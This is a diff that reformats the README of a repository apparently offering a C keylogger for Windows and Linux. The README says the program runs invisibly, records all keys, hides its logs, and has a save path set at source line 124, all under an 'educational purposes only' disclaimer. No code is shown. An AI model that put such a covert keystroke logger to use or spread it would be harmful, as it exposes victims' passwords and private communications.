@@ -1,21 +1,23 @@
 #Hot Chocolate
-This Repository Contains Source Code, Written In C Programming Language , A Keylogger That Works On Windows Machine, as well as on Linux.
+--------------
 
-This Program Is Made Only For Educational Purposes , If You Harm Anyone You Are Responsible For Your Own Actions .
+*This Repository Contains Source Code, Written In C Programming Language , A Keylogger That Works On Windows Machine, as well as on Linux.
 
-You Have To Compile The Source Code To Get The Executable .
+*This Program Is Made Only For Educational Purposes , If You Harm Anyone You Are Responsible For Your Own Actions .
 
-This Keylogger Works Complete invisible , However The Process Is Visible In Task Manager Processes.
+*You Have To Compile The Source Code To Get The Executable .
 
-To Unhide You Can Use The Bat File , or Can compile C Source Code File  UnhideKeylogs.c To Get The Executable ,(Both in Repository).
+*This Keylogger Works Complete invisible , However The Process Is Visible In Task Manager Processes.
 
-Can RECORD ALL KEYS .
+*To Unhide You Can Use The Bat File , or Can compile C Source Code File  UnhideKeylogs.c To Get The Executable ,(Both in Repository).
 
-COMPILATION PREFFERED IDE :> YOU CAN USE CODE BLOCKS FOR SUCCESSFULL COMPILATION OF SOURCE CODE
+*Can RECORD ALL KEYS .
+
+*COMPILATION PREFFERED IDE :> YOU CAN USE CODE BLOCKS FOR SUCCESSFULL COMPILATION OF SOURCE CODE
 
 
-#IMPORTANT : 
-
+*IMPORTANT : 
+----------------
 You Can Make Changes To C source code file , to change the path where you want to save the keylog file , 
 
 MAKE SURE TO CHANGE LINE NUMBER 124 IN SOURCE CODE FILE .
